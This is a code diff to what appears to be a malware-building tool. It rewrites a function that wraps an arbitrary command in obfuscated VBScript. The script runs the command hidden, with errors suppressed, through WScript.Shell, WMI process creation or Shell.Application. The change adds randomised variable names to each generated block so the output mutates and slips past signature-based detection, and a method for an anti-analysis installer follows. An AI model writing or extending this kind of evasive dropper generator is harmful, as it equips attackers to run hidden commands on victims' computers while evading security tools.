@@ -176,54 +176,44 @@ CreateObject("Scripting.FileSystemObject").DeleteFile t
     ) -> str:
         cmd_expr = _vbs_chr_string(command)
 
-        templates = []
+        def _rand():
+            return ''.join(random.choices(string.ascii_lowercase, k=8))
 
-        templates.append(f"""
-On Error Resume Next
-Dim s, c
-Set s = CreateObject("WScript.Shell")
-c = {cmd_expr}
-s.Run c, 0, False
-""")
+        def _make_one(variant):
+            s, c, e = _rand(), _rand(), _rand()
+            if variant == 0:
+                return f"""On Error Resume Next
+Dim {s}, {c}
+Set {s} = CreateObject("WScript.Shell")
+{c} = {cmd_expr}
+{s}.Run {c}, 0, False
+"""
+            elif variant == 1:
+                return f"""On Error Resume Next
+Dim {s}, {e}, {c}
+Set {s} = CreateObject("WScript.Shell")
+Set {e} = {s}.Environment("User")
+{c} = {cmd_expr}
+{e}("TEMP_CMD") = {c}
+{s}.Run {e}("TEMP_CMD"), 0
+"""
+            elif variant == 2:
+                return f"""On Error Resume Next
+Dim {s}, {c}
+Set {s} = GetObject("winmgmts:\\\\.\root\\cimv2:Win32_Process")
+{c} = {cmd_expr}
+{s}.Create {c}, Null, Null, 0
+"""
+            else:
+                return f"""On Error Resume Next
+Dim {s}, {c}
+Set {s} = CreateObject("Shell.Application")
+{c} = {cmd_expr}
+{s}.ShellExecute {c}, , , "open", 0
+"""
 
-        templates.append(f"""
-On Error Resume Next
-Dim s, e, c
-Set s = CreateObject("WScript.Shell")
-Set e = s.Environment("User")
-c = {cmd_expr}
-e("TEMP_CMD") = c
-s.Run e("TEMP_CMD"), 0
-""")
-
-        templates.append(f"""
-On Error Resume Next
-Dim w, c
-Set w = GetObject("winmgmts:\\\\.\root\\cimv2:Win32_Process")
-c = {cmd_expr}
-w.Create c, Null, Null, intPid
-""")
-
-        templates.append(f"""
-On Error Resume Next
-Dim a, c
-Set a = CreateObject("Shell.Application")
-c = {cmd_expr}
-a.ShellExecute c, , , "open", 0
-""")
-
-        templates.append(f"""
-On Error Resume Next
-Dim s, c
-Set s = CreateObject("WScript.Shell")
-c = {cmd_expr}
-s.Run c, 0, False
-""")
-
-        selected = random.choices(templates, k=min(mutations, len(templates)))
-        code = "\n".join(selected)
-
-        return code.strip()
+        blocks = [_make_one(random.randint(0, 3)) for _ in range(min(mutations, 5))]
+        return "\n".join(blocks).strip()
 
     @staticmethod
     def create_anti_analysis_installer(command: str) -> str:
